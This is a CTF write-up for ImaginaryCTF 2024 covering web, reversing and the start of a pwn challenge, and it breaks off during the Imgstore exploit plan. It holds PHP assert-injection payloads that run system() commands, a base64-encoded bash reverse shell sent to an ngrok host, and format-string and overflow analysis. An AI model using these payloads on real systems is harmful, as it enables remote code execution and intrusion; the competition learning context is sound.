<h3> Imaginary CTF 2024 </h3>

![image](https://github.com/user-attachments/assets/39f0b7e9-9548-427f-9e9a-653f6514afd6)

Hello guys, I'm `0x1337` and last night I participated in ImaginaryCTF 

Even though I started really late i'm happy to have least solved some challenges

And in this writeup I'll go through the challenges which I solved

### Web
- Readme
- Journal
- PC2
- Crystals

### Reversing
- Unoriginal
- Rust
- Unconditional
- Absolute Flag Checker
- Watchdog

### Pwn
- Imgstore
- Ropity
- Fermat
- ICTF-Band
- Bopity


---
---

### Web

#### Readme
![image](https://github.com/user-attachments/assets/83893b67-ce4e-4b9f-94f5-d449f57b339b)

We are given the web instance and a file sharing server which has a compressed archive
![image](https://github.com/user-attachments/assets/f3a804c0-ee26-4ce4-8081-22a17d73342f)

After downloading it I uncompressed it and got this
![image](https://github.com/user-attachments/assets/f3c6e762-d328-414c-af87-d3e05ed34d7f)

So that's the application source code

Opening it in VSCode I saw the flag in the `Dockerfile` 
![image](https://github.com/user-attachments/assets/d980e458-4cfa-4eb3-9ad7-a5f8a71465fc)

It seems this was unintended which lead to the release of `Readme2` i presume

In any case I got the flag

```
Flag: ictf{path_normalization_to_the_rescue}
```

#### Journal
![image](https://github.com/user-attachments/assets/af6b8d8f-f7a3-4b35-96a5-ec9aba56ef8b)

After downloading the zip file from the file sharing server I uncompressed it which gave the source code
![image](https://github.com/user-attachments/assets/8765564e-ae62-48cb-bc62-34548ada272d)

You can ignore the `test.php` as it wasn't there initially (i created it for debugging0

Let's check out the source code but before that it's a good practice to check the `Dockerfile`
![image](https://github.com/user-attachments/assets/92d25f25-1bbd-4e93-9b2c-f6b7f20ceff2)

Basically this Dockerfile would install `php:7-apache` then do some web server configuration

And what i mean by that is this:
- Setups the web server files
- Starts Apache HTTP Server in the foreground while setting specific environment variables and user/group permissions. 
- Randomize the flag file name

Ok at this point we know that the `flag.txt` file would be of a random name stored in `/`

That means we might need to get `RCE` to get the name and its content

Moving on we can check the application source code which is `index.php`
![image](https://github.com/user-attachments/assets/fc9faa9d-7a84-4ec8-bf1b-16afea34e301)

```php
<?php

echo "<p>Welcome to my journal app!</p>";
echo "<p><a href=/?file=file1.txt>file1.txt</a></p>";
echo "<p><a href=/?file=file2.txt>file2.txt</a></p>";
echo "<p><a href=/?file=file3.txt>file3.txt</a></p>";
echo "<p><a href=/?file=file4.txt>file4.txt</a></p>";
echo "<p><a href=/?file=file5.txt>file5.txt</a></p>";
echo "<p>";

if (isset($_GET['file'])) {
  $file = $_GET['file'];
  $filepath = './files/' . $file;

  assert("strpos('$file', '..') === false") or die("Invalid file!");
// 
  if (file_exists($filepath)) {
    include($filepath);
  } else {
    echo 'File not found!';
  }
}

echo "</p>";

?>
```

The code isn't much and basically it would include any file passed to the `file` parameter considering it's valid

So this is an `LFI` sort of challenge!

But the issue here is that before it includes our file it would check for the occurrence of `..` in our input, and that's to prevent us from doing directory transversal

The odd thing here is that it uses `assert` for the check

And one issue about `assert` is that it basically does an `eval()` based on the string passed into it

Ok good we can leverage this to get `RCE` 

In order to do that we need to first escape the `strpos` call and here's how I did that

```
rce' and die(system(ls)) or '
```

I got that payload from [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi-via-phps-assert)

Doing that works and I got the current files in that directory
![image](https://github.com/user-attachments/assets/660f400d-32f5-4639-96b9-935b1adbc568)

To get full command execution I used this:
![image](https://github.com/user-attachments/assets/3cb78497-2753-4913-8f84-d757cff22e90)

```
rce' and die(system($_GET['cmd'])) or '&cmd=ls -al
```

Now we can get the flag file name
![image](https://github.com/user-attachments/assets/bcee56f8-008f-43b9-8837-4276c3e6df12)

And then we concatenate it :)
![image](https://github.com/user-attachments/assets/7fe8a59b-4b3a-49e5-988a-fbff042a9095)

```
http://journal.chal.imaginaryctf.org/?file=rce' and die(system($_GET['cmd'])) or '&cmd=cat /flag-cARdaInFg6dD10uWQQgm.txt
```

Cool we got the flag

```
Flag: ictf{assertion_failed_e3106922feb13b10}
```

#### PC2
![image](https://github.com/user-attachments/assets/116d8819-66d3-4211-b047-99acfddfbd56)

As usual we are given the source which we i already downloaded
![image](https://github.com/user-attachments/assets/ef8b62d3-4651-4f3f-90f3-471919416169)

It's a python web application so let's start by checking the `Dockerfile`
![image](https://github.com/user-attachments/assets/99e031fe-aed3-4208-a51a-803d268eb263)

Nothing much here just some setups

Ok so let's check the app source code
![image](https://github.com/user-attachments/assets/839ad87b-4d76-4d88-b7e0-bde4779becc2)
![image](https://github.com/user-attachments/assets/79ae8be4-ba76-424b-95c9-3e981babeaea)

The only available route is `/` and what it does is this:
- Retrieves the `code` body parameter if the http request method is `POST`
- Calls function `xec()` passing the data body as the argument
- Does some regular expression check and if the pattern check doesn't return `None` it would render the `index.html` template

So far nothing interesting here

Let's check the `xec` function
- It would indent the parameter passed into the function
- Generates a random file name based on the `md5` hash of the code content
- Does some python templating inroder to make it a valid python code
- Makes it executable
- And finally runs the python code

The thing of interest here is that it would use our input value and add it to a template which would be stored as a python code then executed

I copied the `xec` function to know how the final python code would be based on our input and saw this
![image](https://github.com/user-attachments/assets/9623c760-0620-486a-a831-730c8570cd56)

This is how the final code would be:

```python
def main():
    print('hi')

from parse import rgb_parse
print(rgb_parse(main())
```

We can decide to check the `parse.rgp_parse` function but that's not needed because `main()` would be called first and it's the value returned from it that's going to be used in the function

In order words because we have control over what will be executed we can inject our malicious code and it would get executed

Cool!

I decided to just get a reverse shell

First I setup ngrok then base64 encode my reverse shell
![image](https://github.com/user-attachments/assets/75358e96-3dee-42be-bf75-03dfdec28d15)

Now i just need to use the `os` module then access the `system` function to execute shell command

Here's my payload
![image](https://github.com/user-attachments/assets/80c98104-f180-4e15-b47f-dc97006bce31)

```python
import os
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC80LnRjcC51cy1jYWwtMS5uZ3Jvay5pby8xNTkxNCAwPiYx | base64 -d | bash')
```

Back to my netcat listener I got a reverse shell
![image](https://github.com/user-attachments/assets/39fcafbb-b047-49be-b1e6-7df4d7af405d)

```
Flag: ictf{d1_color_picker_fr_2ce0dd3d}
```

#### Crystals
![image](https://github.com/user-attachments/assets/673cd703-5455-4266-bc05-3a40e2cbd45e)

After downloading the source code I checked it out

The `Dockerfile` shows it's running a ruby web server
![image](https://github.com/user-attachments/assets/3becf51e-06fc-41d6-a720-c93cfb64a9e2)

The docker compose file shows the flag is stored as the `hostname`
![image](https://github.com/user-attachments/assets/cfb438b8-1278-43f6-b519-44a7781e7d63)

The main application source code shows only one route available which is `/` and what it does is just to include the `index.erb` file
![image](https://github.com/user-attachments/assets/ca88b02e-2469-4873-b5c4-0aa764c72f94)

Ok what exactly do we do?

Since the flag is stored as the `hostname` I tried to leak it by causing an error

And to achieve that I sent an invalid request

To do that I used `curl` because using my web browser ended up urlencoding the path i tried accessing
![image](https://github.com/user-attachments/assets/c1c690ff-0815-4ead-808c-ed6d142e1785)

```
curl 'http://crystals.chal.imaginaryctf.org/`'
```

And with that I got the flag

```
Flag: ictf{seems_like_you_broke_it_pretty_bad_76a87694}
```

---
---

### Reversing

#### Unoriginal
![image](https://github.com/user-attachments/assets/d3758826-a91d-4f4c-8393-29d3c520740d)

I downloaded the executable and checked what type of file it is
![image](https://github.com/user-attachments/assets/2899bd68-c53a-45d0-a846-e46a8469ee95)

Ok a x64 binary which is not stripped

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/40fccd39-a8e2-446d-ac8e-890ad98e5185)

It requires us to give it the right flag

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/45f46868-70a8-49bc-bfd2-a612ea87bf12)

So reading through the disassembly we see that it would:
- Print out the msg
- Receive our input which is stored in `rbp+s1`
- Initializes a counter variable `rbp+var_44` to `0`
- It then jumps to `loc_122E` which checks if the counter is equal to `0x2f`
- If that counter is less than the expected value it jumps to `loc_1212`
- And what that does is basically performing a xor operation on the input value at the counter index with 5
- But if the length comparism doesn't return True with will then compare the our encrypted value against a hardcoded one
  - If this `strcmp` call returns `True` that means we got the flag else that's the wrong flag
 

At this point it's clear that the encryption logic is basically using xor with key of 5 against our input and then comparing it against a hardcoded encrypted flag

To reverse it we just need to xor the encrypted flag with 5

I used cyberchef to do that
![image](https://github.com/user-attachments/assets/a3d589b4-52d4-40e3-83bd-83fd27740c4b)

```
Flag: ictf{just_another_flag_checker_a3465d5e5ee234ba}
```

#### Rust
![image](https://github.com/user-attachments/assets/eac743f7-2471-4b3b-8d1e-0c79774595c8)

After downloading attached file I saw it was a binary and an output file

Checking the file type of the executable shows this
![image](https://github.com/user-attachments/assets/9a09749c-92c3-4a99-b452-6147d4c4bcf2)

So we are working with a 64bits binary which is dynamically linked and not stripped

And good enough we have debug_info enabled which means there would debug symbols

The other file attached is output.txt, which contains the output from when the author ran the program against the flag

Let's also run it to get an overview of what it does
![image](https://github.com/user-attachments/assets/5361b299-5fde-452b-938a-62b484ed6561)

Ok good at this point we know that the encryption algorithm always would return the same value if the key is the same

Time to reverse it

Using Ghidra I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/338fda27-fd26-46a1-bb48-d47dfe0928d9)

Because `debug_info` is enabled, it makes life much easier for me since I'm not familiar with rust internals or the Rust programming language. This way, I won't end up trying to reverse-engineer an internal implementation 😅

Ok let us continue

```c
void main(int param_1,u8 **param_2)

{
  std::rt::lang_start<()>(rust::rust::main,(long)param_1,param_2,0);
  return;
}
```

So it calls `rust::rust::main` and here's the decompilation
![image](https://github.com/user-attachments/assets/f9650417-f2cb-4301-9a53-1cdc9f1676a1)

Basically it would print out the text, receive the msg and the key then call the `encrypt` function

```c
encrypt((char *)local_50._8_8_,stack0xffffffffffffffb8.length);
```

We can assume that the `encrypt` function would require the `msg & key` as the parameter but to confirm I set a breakpoint at the `call` to this function
![image](https://github.com/user-attachments/assets/2e26eca8-7b9d-4af7-85d1-2a56e0980fd0)
![image](https://github.com/user-attachments/assets/5eafaf61-08a8-4c8d-83a0-623ab4031b88)

Ok good our assumption was almost right but this correct calling convention is this:

```c
encrypt(char *msg, int msg_length, int key);
```

The reason why Ghidra didn't get that right is because the data type wasn't set correctly, if I'm not mistaken

Moving on, let us check out the encrypt function decompilation
![image](https://github.com/user-attachments/assets/bb044728-318d-4b29-9f59-fe5bd3d628f6)

Wait wtf the parameters to this function is just 2?

```c
rust::rust::encrypt(char *message,int key)
```

And from the debug symbol it shows the right way it's called

```rust
void encrypt(&str message, u128 key)
```

Oh well, let's continue

![image](https://github.com/user-attachments/assets/1848087f-c314-48a8-bf6a-93d3c4e23620)

I put the `encrypt` function decompilation [here](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Rust/encrypt.c)

So what does this do?

The main part where it does the encryption is here:

```c
    local_80 = (ulong)extraout_DL << 5;
    local_70 = local_80 >> 3;
    local_68 = 0;
    local_60 = in_RDX ^ local_70;
    uVar3 = local_60 + 0x539;
    uVar2 = in_RCX + (0xfffffffffffffac6 < local_60);
    if (SCARRY8(in_RCX,0) != SCARRY8(in_RCX,(ulong)(0xfffffffffffffac6 < local_60))) break;
    local_40 = ~uVar3;
    local_38 = ~uVar2;
```

And I had to read the disassembly from `rust::encrypt`

```c
   0x000055555555e3a8 <+600>:   mov    rcx,QWORD PTR [rsp+0x58]
   0x000055555555e3ad <+605>:   mov    rax,QWORD PTR [rsp+0x60]
   0x000055555555e3b2 <+610>:   shld   rax,rcx,0x5
   0x000055555555e3b7 <+615>:   mov    QWORD PTR [rsp+0x38],rax
   0x000055555555e3bc <+620>:   shl    rcx,0x5
   0x000055555555e3c0 <+624>:   mov    QWORD PTR [rsp+0x40],rcx
   0x000055555555e3c5 <+629>:   mov    QWORD PTR [rsp+0x178],rcx
   0x000055555555e3cd <+637>:   mov    QWORD PTR [rsp+0x180],rax
   0x000055555555e3d5 <+645>:   mov    rcx,QWORD PTR [rsp+0x90]
   0x000055555555e3dd <+653>:   mov    rdx,QWORD PTR [rsp+0x98]
   0x000055555555e3e5 <+661>:   mov    rax,QWORD PTR [rsp+0x38]
   0x000055555555e3ea <+666>:   mov    rdi,QWORD PTR [rsp+0x40]
   0x000055555555e3ef <+671>:   mov    rsi,rax
   0x000055555555e3f2 <+674>:   shld   rsi,rdi,0x3d
   0x000055555555e3f7 <+679>:   sar    rax,0x3
   0x000055555555e3fb <+683>:   mov    QWORD PTR [rsp+0x190],rax
   0x000055555555e403 <+691>:   mov    QWORD PTR [rsp+0x188],rsi
   0x000055555555e40b <+699>:   xor    rdx,rsi
   0x000055555555e40e <+702>:   xor    rcx,rax
   0x000055555555e411 <+705>:   mov    QWORD PTR [rsp+0x1a0],rcx
   0x000055555555e419 <+713>:   mov    QWORD PTR [rsp+0x198],rdx
   0x000055555555e421 <+721>:   add    rdx,0x539
   0x000055555555e428 <+728>:   mov    QWORD PTR [rsp+0x28],rdx
   0x000055555555e42d <+733>:   adc    rcx,0x0
   0x000055555555e431 <+737>:   seto   al
   0x000055555555e434 <+740>:   mov    QWORD PTR [rsp+0x30],rcx
   0x000055555555e439 <+745>:   test   al,0x1
   0x000055555555e43b <+747>:   jne    0x55555555e4a0 <_ZN4rust7encrypt17h4f52d2bd6ffc7936E+848>
   0x000055555555e43d <+749>:   mov    rcx,QWORD PTR [rsp+0x90]
   0x000055555555e445 <+757>:   mov    rdx,QWORD PTR [rsp+0x98]
   0x000055555555e44d <+765>:   mov    rsi,QWORD PTR [rsp+0x30]
   0x000055555555e452 <+770>:   mov    rax,QWORD PTR [rsp+0x28]
   0x000055555555e457 <+775>:   mov    QWORD PTR [rsp+0x1a8],rax
   0x000055555555e45f <+783>:   mov    QWORD PTR [rsp+0x1b0],rsi
   0x000055555555e467 <+791>:   not    rax
   0x000055555555e46a <+794>:   mov    QWORD PTR [rsp+0x8],rax
   0x000055555555e46f <+799>:   not    rsi
   0x000055555555e472 <+802>:   mov    QWORD PTR [rsp+0x10],rsi
   0x000055555555e477 <+807>:   mov    QWORD PTR [rsp+0x1c0],rsi
   0x000055555555e47f <+815>:   mov    QWORD PTR [rsp+0x1b8],rax
   0x000055555555e487 <+823>:   add    rdx,rdx
   0x000055555555e48a <+826>:   mov    QWORD PTR [rsp+0x18],rdx
   0x000055555555e48f <+831>:   adc    rcx,rcx
   0x000055555555e492 <+834>:   setb   al
   0x000055555555e495 <+837>:   mov    QWORD PTR [rsp+0x20],rcx
   0x000055555555e49a <+842>:   test   al,0x1
```

Then after understanding it, I wrote the python equivalent which is this:

```python
def encrypt(msg, msg_len, key):
    enc = []
    for i in range(msg_len):
        current_value = ord(msg[i])
        shift_left = current_value << 5
        mangle = ((shift_left << 0x3d) >> 56) >> 8
        var1 = ~((mangle ^ key) + 0x539)

        enc.append(var1)
    
    print(enc)
```

I tested my encryption function and it turned out right

So now how do we go about reversing that?

One thing we need to know is that it uses the provided `key` as the `xor` key

So let's start the reverse option

Moving backwards we need to recover `mangle ^ key` and we can do that by doing this:

```
~(enc) - 0x539
```

Now to recover `mangle` we need the xor key but in this case we don't know the xor key used to encrypt the flag

But because of the symmetric property of XOR we can recover the `key` using this:

```
(~(enc) - 0x539) ^ ord(known_pt[0])
```

Since we know the flag starts with `ictf` we can basically use the first character to recover the key

But I noticed even though that partiallly worked it didn't really give the correct key

In my case when testing I noticed that the last 4 digits are not right

That isn't a problem because we can just brute force it

Moving on, we assume we have the right key so now we need to recover `mangle`

```
(~(enc) - 0x539) ^ key
```

Ok good so now we recover `shift_left`

```
demangle = ((((~(enc) - 0x539) ^ key) << 8) << 56) >> 0x3d
```

And finally we recover the original value

```
flag_char = ((((((~(enc) - 0x539) ^ key) << 8) << 56) >> 0x3d) >> 5) & 0xff
```

With that I wrote a [script](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Rust/solve.py) to get the flag:

```python
def reverse(enc):
    key_ = ((~(enc[0]) - 0x539) ^ ord('i')) >> 16
   
    for key in range(key_, key_+9999):
        pt = ""
        for i in range(len(enc)):
            v1 = (~(enc[i]) - 0x539) ^ key
            demangle = ((v1 << 8) << 56) >> 0x3d
            pt += chr((demangle >> 5) & 0xff)

        if "ictf" in pt:
            print(pt)
            break


def main():
    enc = [-42148619422891531582255418903, -42148619422891531582255418927, -42148619422891531582255418851, -42148619422891531582255418907, -42148619422891531582255418831, -42148619422891531582255418859, -42148619422891531582255418855, -42148619422891531582255419111, -42148619422891531582255419103, -42148619422891531582255418687, -42148619422891531582255418859, -42148619422891531582255419119, -42148619422891531582255418843, -42148619422891531582255418687, -42148619422891531582255419103, -42148619422891531582255418907, -42148619422891531582255419107, -42148619422891531582255418915, -42148619422891531582255419119, -42148619422891531582255418935, -42148619422891531582255418823]

    reverse(enc)
    

if __name__ == '__main__':
    main()
```

Running it gives the flag
![image](https://github.com/user-attachments/assets/4baf7718-f850-4d77-b382-6a006cfab751)

```
Flag: ictf{ru57_r3v_7f4d3a}
```

#### Unconditional
![image](https://github.com/user-attachments/assets/2f059929-1c50-4f4f-93f8-50a644ae9b9d)

After downloading the binary I checked the file type
![image](https://github.com/user-attachments/assets/a351c1dd-e692-4cd5-b44f-2efc0dcee1cc)

We are working with a x64 binary which is not stripped and dynamically linked

I ran it to get an overview of what it does
![image](https://github.com/user-attachments/assets/f984f308-46e4-4785-a4bf-ed19bace0cfd)

Weird it just prints out some hex values

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/dadfc162-ffb1-4fff-822e-487f4bac68b7)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int v10; // eax
  int v11; // eax
  int v12; // eax
  int v13; // eax
  int v14; // eax
  int v15; // eax
  int v16; // eax
  int v17; // eax
  int v18; // eax
  int v19; // eax
  int v20; // eax
  int v21; // eax
  int v22; // eax
  int v23; // eax
  int v24; // eax
  int v25; // eax
  int v26; // eax
  int v27; // eax
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  int v32; // eax
  int v33; // eax
  int v34; // eax

  v3 = iterate(0);
  v4 = iterate(v3);
  v5 = iterate(v4);
  v6 = iterate(v5);
  v7 = iterate(v6);
  v8 = iterate(v7);
  v9 = iterate(v8);
  v10 = iterate(v9);
  v11 = iterate(v10);
  v12 = iterate(v11);
  v13 = iterate(v12);
  v14 = iterate(v13);
  v15 = iterate(v14);
  v16 = iterate(v15);
  v17 = iterate(v16);
  v18 = iterate(v17);
  v19 = iterate(v18);
  v20 = iterate(v19);
  v21 = iterate(v20);
  v22 = iterate(v21);
  v23 = iterate(v22);
  v24 = iterate(v23);
  v25 = iterate(v24);
  v26 = iterate(v25);
  v27 = iterate(v26);
  v28 = iterate(v27);
  v29 = iterate(v28);
  v30 = iterate(v29);
  v31 = iterate(v30);
  v32 = iterate(v31);
  v33 = iterate(v32);
  v34 = iterate(v33);
  iterate(v34);
  return 0;
}
```

Ok so we see that it basically calls the `iterate` function with `0` and the result returned from that function is used as the next parameter to the `iterate` function

That is about done 32 times

So this means the main logic is going to be the `iterate` function

Here's the decompilation
![image](https://github.com/user-attachments/assets/200de59f-a073-4aef-a864-d0656167c29a)

```c
__int64 __fastcall iterate(int a1)
{
  bool v1; // al
  unsigned __int8 v3; // [rsp+19h] [rbp-7h]
  bool v4; // [rsp+1Eh] [rbp-2h]

  v3 = flag[a1];
  v4 = (a1 & 1) != 0;
  v1 = v3 > 0x60u && v3 <= 0x7Au;
  flag[a1] = (((v3 >> table2[iterate(int)::counter2]) | (v3 << (8 - table2[iterate(int)::counter2]))) * v1
            + !v1 * (((v3 << 6) | (v3 >> 2)) ^ table1[iterate(int)::counter1]))
           * ((a1 & 1) == 0)
           + ((v3 ^ table1[iterate(int)::counter1]) * v1 + !v1 * ((4 * v3) | (v3 >> 6))) * ((a1 & 1) != 0);
  iterate(int)::counter1 = (v4 + iterate(int)::counter1) % 6;
  iterate(int)::counter2 = (v4 + iterate(int)::counter2) % 6;
  printf("%02x,", flag[a1]);
  return (a1 + 1);
}
```

So this function modifies the flag character at the specified index and returns the next index

I translated this function to it's python representation 

```python
def iterate(i):
    nonlocal counter1, counter2, final_str
    char = flag[i]
    v4 = (i & 1) != 0
    v1 = 0x60 < char <= 0x7A
    if (i & 1) == 0:
        if v1:
            rotated = (char >> table2[counter2]) | (char << (8 - table2[counter2]))
            flag[i] = rotated & 0xFF 
        else:
            rotated = ((char << 6) | (char >> 2)) ^ table1[counter1]
            flag[i] = rotated & 0xFF 
    else:
        if v1:
            flag[i] = (char ^ table1[counter1]) & 0xFF  
        else:
            flag[i] = ((4 * char) | (char >> 6)) & 0xFF 
    counter1 = (v4 + counter1) % 6
    counter2 = (v4 + counter2) % 6
    return i + 1
```

And after some tests, I figured out that this algorithm basically modifies the characters deterministically, which means that the characters are modified independently of each other.

With that I wrote a brute force script which just tries all printable characters passes it into the encryption algorithm and check if it equals the modified flag at the same index

Here's my [solve](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Unconditional/solve.py)

```python
import string

table1 = [0x52, 0x64, 0x71, 0x51, 0x54, 0x76]
table2 = [1, 3, 4, 2, 6, 5]

target = [0xb4, 0x31, 0x8e, 0x02, 0xaf, 0x1c, 0x5d, 0x23, 0x98, 0x7d, 0xa3, 0x1e, 0xb0, 0x3c, 0xb3, 0xc4,
          0xa6, 0x06, 0x58, 0x28, 0x19, 0x7d, 0xa3, 0xc0, 0x85, 0x31, 0x68, 0x0a, 0xbc, 0x03, 0x5d, 0x3d, 0x0b]

def solve(flag):
    flag = [i for i in flag]

    counter1 = 0
    counter2 = 0

    final_str = []

    def iterate(i):
        nonlocal counter1, counter2, final_str
        char = flag[i]
        v4 = (i & 1) != 0
        v1 = 0x60 < char <= 0x7A
        if (i & 1) == 0:
            if v1:
                rotated = (char >> table2[counter2]) | (char << (8 - table2[counter2]))
                flag[i] = rotated & 0xFF 
            else:
                rotated = ((char << 6) | (char >> 2)) ^ table1[counter1]
                flag[i] = rotated & 0xFF 
        else:
            if v1:
                flag[i] = (char ^ table1[counter1]) & 0xFF  
            else:
                flag[i] = ((4 * char) | (char >> 6)) & 0xFF 
        counter1 = (v4 + counter1) % 6
        counter2 = (v4 + counter2) % 6
        return i + 1

    i = 0
    while i < len(flag):
        i = iterate(i)
    return flag


flag = [0 for i in target]
all_chars = [[] for i in target]
charset = string.digits + string.ascii_letters + string.punctuation

for i in range(len(target)):
    for c in charset:
        flag[i] = ord(c)
        res = solve(flag)
        if res[i] == target[i]:
            all_chars[i].append(c)
    if len(all_chars[i]) == 0:
        if i == 4:
            flag[i] = ord('{')
        continue
    flag[i] = ord(all_chars[i][0])
    print(''.join(chr(c) for c in flag))

m = max([len(i) for i in all_chars])

for r in range(m):
    for i in range(len(all_chars)):
        if r < len(all_chars[i]):
            print(all_chars[i][r], end='')
        else:
            print('', end='')
    print()
```

Running it i got the flag
![image](https://github.com/user-attachments/assets/7ab29004-b455-410d-9111-5a06a87daf35)

```
ictf{m0r3_than_1jway5_t0_c0n7r0l}
```

But that doesn't work!

If you read it you will notice the issue 

The final flag is this:

```
Flag: ictf{m0r3_than_1_way5_t0_c0n7r0l}
```

#### Absolute Flag Checker
![image](https://github.com/user-attachments/assets/394034a5-df97-43ac-8cfd-0c11d4fccba9)

After downloading the attachment i saw that it's a 64bits Windows Portable Executable file
![image](https://github.com/user-attachments/assets/2e1b5d2e-f0b3-4de4-96d5-cdf1c9a5e6cf)

I ran it using `wine` and it showed this
![image](https://github.com/user-attachments/assets/1997080a-80f8-4e3f-a82e-0abf5b8b3e3c)

Hmm not output

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/12501fa3-75db-436f-8135-f64310307ad7)

Ok the code is really long

But the idea is that we need the flag characters to satisfy each of does equations

Incase you want the whole decompilation you can find it [here](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Absolute%20Flag%20Checker/main.c)

So how do we go about it?

It's not possible to solve the equation by hand so we need to make use of a symbolic execution solver like angr?

But I think that's too much for angr cause the equation is much and it would take lot of time

And besides I don't know how to use angr well :(

So I made use of Z3 which is an SMT solver

Here's my solve [script](https://github.com/7h30ry/writeups/blob/main/ImaginaryCTF24/Solve%20Scripts/Absolute%20Flag%20Checker/solve.py)

Running it takes quite a lot of time but it worked!

```
Flag: ictf{that_is_a_lot_of_equations_n2u1iye21azl21}
```

---
---

### Pwn

#### Imgstore

![image](https://github.com/user-attachments/assets/238d2190-15e9-40ca-9846-778d12c582ff)

I'm getting tired of making this writeup so i'll make it quick

The attached executable came with it's shared library as to which i patched using `pwninit`
![image](https://github.com/user-attachments/assets/1300bb0c-4536-4c43-ad60-f0dcb55f5e1f)

All protections are enabled on this binary
![image](https://github.com/user-attachments/assets/0d8fcbf0-5b79-435a-94cb-c2a6b0b7f7eb)

When you run the program you'd get this
![image](https://github.com/user-attachments/assets/b6def9e0-d813-4a37-8f3a-f951874ad2a9)

We can:
- List Books
- Buy Books
- Sell Books
- Exit

Using IDA I decompiled the binary and here's the main function
![image](https://github.com/user-attachments/assets/8b1632cd-2c72-460f-a4d5-aef33f7c4f9e)

Since the binary is stripped we don't have function names 

So when I was solving it I had to first reverse it and rename some variables

But I'll go straight to the point here

In function `sub_208B` is the portion that handles the program logic
![image](https://github.com/user-attachments/assets/d65265ed-a03d-47ae-9c43-86ee621eb634)

```c
unsigned __int64 sub_208B()
{
  int v1; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  do
  {
    puts(" +=======================+");
    puts(" |                       |");
    puts(" |     IMG BOOKSTORE     |");
    puts(" |                       |");
    puts(" +=-=-=-=-=-=-=-=-=-=-=-=+");
    puts(" |                       |");
    puts(" | [1]. List Books.      |");
    puts(" | [2]. Buy Book.        |");
    puts(" | [3]. Sell Book.       |");
    puts(" | [4]. Exit.            |");
    puts(" |                       |");
    puts(" +=======================+");
    puts(&s);
    printf(">> ");
    __isoc99_scanf("%1d", &v1);
    getchar();
    if ( v1 == 4 )
    {
      puts(&s);
      printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
      sleep(1u);
      exit(0);
    }
    if ( v1 <= 4 )
    {
      switch ( v1 )
      {
        case 3:
          sub_1E2A();
          continue;
        case 1:
          sub_19D2();
          continue;
        case 2:
          sub_1F9A();
          continue;
      }
    }
    printf("%s[/] Invalid option..%s\n", "\x1B[33m", "\x1B[0m");
    puts(&s);
  }
  while ( v1 != 3 );
  return __readfsqword(0x28u) ^ v2;
}
```

From the choices we can pick from the menu the only function that has the bug is option 3 which is "Buy Books" 

When we check the decompilation on function `sub_1E2A` we get this
![image](https://github.com/user-attachments/assets/caa3f046-a495-477b-b4c6-e4990b642353)

I'll just rename this portion since it's where the first vulnerability resides

```
unsigned __int64 buy_book()
{
  char v1; // [rsp+7h] [rbp-59h] BYREF
  int buf; // [rsp+8h] [rbp-58h] BYREF
  int fd; // [rsp+Ch] [rbp-54h]
  char title[72]; // [rsp+10h] [rbp-50h] BYREF
  unsigned __int64 v5; // [rsp+58h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fd = open("/dev/urandom", 0);
  read(fd, &buf, 4uLL);
  close(fd);
  buf = (unsigned __int16)buf;
  do
  {
    printf("Enter book title: ");
    fgets(title, 50, stdin);
    printf("Book title --> ");
    printf(title);
    puts(&s);
    if ( 334873123 * buf == dword_6050 )
    {
      dword_608C = 2;
      sub_1D77(2LL);
    }
    puts("Sorry, we already have the same title as yours in our database; give me another book title.");
    printf("Still interested in selling your book? [y/n]: ");
    __isoc99_scanf("%1c", &v1);
    getchar();
  }
  while ( v1 == 121 );
  puts(&s);
  printf("%s[-] Exiting program..%s\n", "\x1B[31m", "\x1B[0m");
  sleep(1u);
  return __readfsqword(0x28u) ^ v5;
}
```

Here's what it does:
- Reads 4 random bytes from `/dev/urandom`
- Gets the 2 bytes from the random byte read in and store it in `buf`
- While our input is `y` it would do this:
    - Reads 50 bytes from stdin and store in `title`
    - Prints the value stored in `title`
    - Does a comparism against a 4 bytes value with `buf * 334873123`
    - If the comparism returns True it will call function `sub_1D77` passing 2 as the parameter
    - Else it would return
 

Now the bug here is this:

```
printf(title)
```

It is printing our input without specifying a format which leads to a `Format String Bug`

But now let's see what can we use this for?

Looking through we see that it does a comparism against a calculated value with a hardcoded value

That hardcoded value stored in `dword_6050` is `0xFEEDBEEF`
![image](https://github.com/user-attachments/assets/67f23ec8-653e-4687-bda9-21d6092b922f)

Why is that even important?

Well if the comparism happens to return it would call function `sub_1D77`

Let us see what that does
![image](https://github.com/user-attachments/assets/41eafae6-be09-435e-9d54-134fdee0d38e)

```c
unsigned __int64 __fastcall sub_1D77(int a1)
{
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  unsigned __int64 v3; // [rsp+78h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  sub_18F2();
  if ( a1 == 2 )
  {
    printf("%s[/] UNDER DEVELOPMENT %s\n", "\x1B[44m", "\x1B[0m");
    putchar(62);
    fgets(s, 160, stdin);
  }
  else
  {
    printf("%s[!] SECURITY BREACH DETECTED%s\n", "\x1B[41m", "\x1B[0m");
    puts("[+] BAD HACKER!!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

Basically this is a function that would receive our input if the parameter passed into it is `2`

And it's vulnerable to buffer overflow:

```c
char s[104];
fgets(s, 160, stdin);
```

Because it's reading in at most 160 bytes into a buffer that can only hold up 104 bytes of data

With this what should we do?

This is how my exploit plan goes:
- Leak the random 2 bytes, pie address, libc address and canary on the stack
- Perform the multiplication and overwrite `dword_6050` to the expected value using format string write 
